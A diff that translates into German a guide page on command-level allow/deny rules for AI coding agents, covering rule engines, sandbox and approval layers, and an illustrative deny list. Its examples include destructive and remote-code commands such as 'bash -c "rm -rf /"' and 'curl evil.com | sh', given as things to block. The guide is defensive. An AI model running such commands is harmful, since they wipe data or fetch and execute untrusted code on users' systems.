@@ -1,67 +1,67 @@
 ---
-title: Command Rules
-description: Command-level allow/deny for shell and tool calls—more executable than verbal agreement.
+title: Befehlsregeln
+description: "Befehlsweises Allow/Deny für Shell und Werkzeugaufrufe — ausführbarer als mündliche Absprachen."
 locale: de
-source_locale: en
-source_revision: a397cb9
-translation_status: fallback
-translated_at: '2026-07-28'
+source_locale: zh-CN
+source_revision: 5f36443
+translation_status: draft
+translated_at: 2026-07-28
 ---
 
-**Command rules** focus on “which commands the Agent may run and with what arguments.” They are the most common form of [Allow and Deny Rules](/guide/customization/rules/allow-and-deny-patterns/), usually in team-reviewable configuration or rule files.
+**Befehlsregeln** fokussieren „welche Befehle der Agent mit welchen Argumenten ausführen darf“. Sie sind die häufigste Form von [Erlauben und Ablehnen](/guide/customization/rules/allow-and-deny-patterns/) und stehen typischerweise in team-reviewbaren Config- oder Regeldateien.
 
-## What This Page Covers
+## Was diese Seite behandelt
 
-- Division of labor among command rules, sandbox, and approval dialogs
-- How to write a “narrow enough” allowlist
-- Alignment with CI and local dev scripts
+- Arbeitsteilung von Befehlsregeln, Sandbox und Freigabe-Dialogen
+- Wie man Allowlists „eng genug“ schreibt
+- Abgleich mit CI und lokalen Dev-Skripten
 
-## What Command Rules Control
+## Was Befehlsregeln steuern
 
-If allow/deny states what is allowed in principle, command rules land that at the most concrete layer:
+Allow/Deny sagt „was grundsätzlich erlaubt ist“; Befehlsregeln machen das konkret:
 
-- Which commands may run
-- Which may not
-- Which look similar but differ greatly in risk
+- Welche Befehle laufen dürfen
+- Welche nicht
+- Welche ähnlich aussehen, aber sehr unterschiedlich riskant sind
 
-The point is turning boundaries the team already knows into boundaries the machine can enforce.
+Ziel: Grenzen, die das Team ohnehin kennt, maschinenausführbar machen.
 
-## One Core Concept First
+## Ein Kernkonzept
 
-Rules match **executable intent**, not natural language. `npm test` and `npm run test` are two different commands in policy; `bash -c "rm -rf /"` must not pass because `bash` was allowed.
+Regeln matchen **ausführbare Absicht**, nicht natürliche Sprache. `npm test` und `npm run test` sind strategisch zwei Befehle; `bash -c "rm -rf /"` wird nicht freigegeben, nur weil `bash` erlaubt ist.
 
 ```text
-User task → model proposes command → rule engine → (pass) sandbox execution / (reject) approval or block
+Benutzeraufgabe → Modell schlägt Befehl vor → Regel-Engine → (OK) Sandbox-Ausführung / (Ablehnen) Freigabe nötig oder Block
 ```
 
-## Common Misconceptions
+## Häufige Missverständnisse
 
-### Similar commands, different risk
+### Ähnliche Befehle ≠ gleiches Risiko
 
-Beginners often underestimate small differences.
+Einsteiger unterschätzen oft kleine Unterschiede.
 
-For example:
+Zum Beispiel:
 
-- `git status` vs `git reset --hard`
-- `npm test` vs `npm publish`
-- `curl example.com` vs `curl example.com | sh`
+- `git status` vs. `git reset --hard`
+- `npm test` vs. `npm publish`
+- `curl example.com` vs. `curl example.com | sh`
 
-All look like “run something in the terminal,” but risk is not the same level.
+Alles „Terminal-Befehl“ — Risiko völlig anders.
 
-### Allowing a general entry point often opens too much
+### Einen Generalschlüssel erlauben ≈ zu viel freigeben
 
-Allowing `bash`, `sh`, and similar general entry points may feel convenient.
+`bash` oder `sh` direkt zu erlauben wirkt bequem.
 
-From a rules perspective, that usually allows many dangerous compositions afterward.
+Regeltechnisch öffnet das oft viele gefährliche Zusammensetzungen hinterher.
 
-## Minimum Viable Practice
+## Minimal nutzbares Vorgehen
 
-1. **Deny dangerous commands outside write operations by default**: `rm -rf`, `curl | bash`, `git push --force`
-2. **Allow common read-only/build commands in the project**: `git status`, `npm test`, `pnpm lint`
-3. **Put rules in Git**, consistent with “test commands” in `AGENTS.md`
-4. **Review rule changes in PR**, like Dockerfile changes
+1. **Gefährliche Befehle außer Schreiboperationen standardmäßig ablehnen**: `rm -rf`, `curl | bash`, `git push --force`
+2. **Häufige Nur-Lese-/Build-Befehle im Projekt erlauben**: `git status`, `npm test`, `pnpm lint`
+3. **Regeln nach Git**, konsistent mit „Testbefehlen“ in `AGENTS.md`
+4. **Regeländerungen in PRs reviewen**, wie ein Dockerfile
 
-Illustrative (format per official configuration):
+Schema (Format laut offizieller Config):
 
 ```json
 {
@@ -81,52 +81,52 @@ Illustrative (format per official configuration):
 }
 ```
 
-## Recommended Workflow
+## Empfohlener Workflow
 
-| Step | Practice |
+| Schritt | Vorgehen |
 |---|---|
-| Inventory | Extract real commands from `package.json` scripts, Makefile, CI workflow |
-| Layer | Organization deny baseline → project allow supplement → personal local exception (if any) |
-| Trial | Validate with low-risk tasks: “should approve does; should block blocks” |
-| Align | Local rules and [GitHub Action](/guide/developer-platform/ci-cd/code-review-automation/) share source when possible |
+| Inventur | Echte Befehle aus `package.json`-Scripts, Makefile, CI-Workflows |
+| Schichten | Organisations-Deny → Projekt-Allow → persönliche lokale Ausnahme (falls) |
+| Probelauf | Niedrigrisiko-Aufgabe: „was durchsollte geht, was blockieren sollte blockiert“ |
+| Abgleich | Lokale Regeln möglichst gleichursprünglich mit [GitHub Action](/guide/developer-platform/ci-cd/code-review-automation/) |
 
-## Common Mistakes
+## Häufige Fehler
 
-- **Allowlist too wide**: allowing `bash`, `sh`, `sudo` is like allowing everything
-- **Only deny, no allow**: still many approvals; teams habitually click through
-- **Docs disagree**: `AGENTS.md` says `pnpm test`, rules only have `npm test`
-- **Ignore pipes and redirects**: `curl evil.com | sh` needs whole-command policy, not just the first token
+- **Zu weite Allowlist**: `bash`, `sh`, `sudo` ≈ alles freigeben
+- **Nur Deny, kein Allow**: weiterhin viele Freigaben — Team klickt Gewohnheit „Alles durch“
+- **Doku-Inkonsistenz**: `AGENTS.md` sagt `pnpm test`, Regeln nur `npm test`
+- **Pipes und Redirects ignorieren**: `curl evil.com | sh` braucht Gesamtstrategie, nicht nur das erste Wort
 
-Command rules are not “memorizing commands”—they separate daily actions from commands that, once allowed, blow open the risk boundary.
+Befehlsregeln „merken“ keine Befehle — sie trennen Alltag von Aktionen, die mit der Freigabe die Risikogrenze mit öffnen.
 
-## Security Boundaries
+## Sicherheitsgrenzen
 
-- Command rules **cannot** replace branch protection and code review
-- Malicious prompts may induce the Agent to **attempt** over-privileged commands—keep sandbox defaults strict
-- Environment variables with keys or tokens should not leak because “echo was allowed”
+- Befehlsregeln **ersetzen** Branch-Schutz und Code-Review **nicht**
+- Bösartige Prompts können den Agent zu **Übergriffsversuchen** verleiten — Sandbox-Default streng
+- Umgebungsvariablen mit Secrets/Token nicht durch „`echo` erlaubt“ leaken lassen
 
-## Acceptance Checklist
+## Abnahmeliste
 
-- [ ] You can list 3–5 “run daily” commands for this repo and reflect them in rules
-- [ ] High-risk commands like `git push` and forced reset are denied by default or need explicit approval
-- [ ] Rule changes go through PR and do not contradict `AGENTS.md`
+- [ ] 3–5 „täglich Pflicht“-Befehle des Repos listen und in Regeln abbilden
+- [ ] `git push`, Force-Reset usw. standardmäßig ablehnen oder explizite Freigabe verlangen
+- [ ] Regeländerungen per PR, widerspruchsfrei zu `AGENTS.md`
 
-## Related Chapters
+## Verwandte Kapitel
 
-- [Allow and Deny Patterns](/guide/customization/rules/allow-and-deny-patterns/)
-- [Team Rules Policy](/guide/customization/rules/team-rules/)
-- [CLI Approval and Sandbox](/guide/cli/approvals-and-sandbox/)
-- [Permission Matrix](/guide/reference/permission-matrix/)
+- [Erlauben und Ablehnen](/guide/customization/rules/allow-and-deny-patterns/)
+- [Teamregel-Strategie](/guide/customization/rules/team-rules/)
+- [CLI-Freigabe und Sandbox](/guide/cli/approvals-and-sandbox/)
+- [Berechtigungsmatrix](/guide/reference/permission-matrix/)
 
-## References
+## Quellen
 
 - stormzhang `15-permissions.md`, `18-config.md`
-- KimYx0207 permissions and configuration chapter
-- freestylefly/CodexGuide team playbook
+- KimYx0207 Kapitel Berechtigungen und Config
+- freestylefly/CodexGuide Team-Playbook
 
 ---
 
 **Status:** verified  
-**Applicable products:** CLI / App  
-**Verification basis:** OpenAI’s current Codex CLI documentation still treats command execution, approval modes, and sandbox isolation as core security boundaries; this page positions command rules as an engineering pattern for separating high- and low-risk commands and marks the JSON snippet as illustrative, not official syntax.  
-**Last verified:** 2026-07-26
+**Gilt für:** CLI / App  
+**Prüfgrundlage:** Aktuelle OpenAI-Codex-CLI-Dokumentation behandelt Befehlsausführung, Freigabemodi und Sandbox-Isolation weiterhin als Kern-Sicherheitsgrenze; diese Seite positioniert Befehlsregeln als Engineering-Muster „Hoch-/Niedrigrisiko-Befehle getrennt verwalten“ und markiert JSON-Fragmente ausdrücklich als Schema, nicht als offizielle Syntax-Fakten.  
+**Zuletzt geprüft:** 2026-07-26
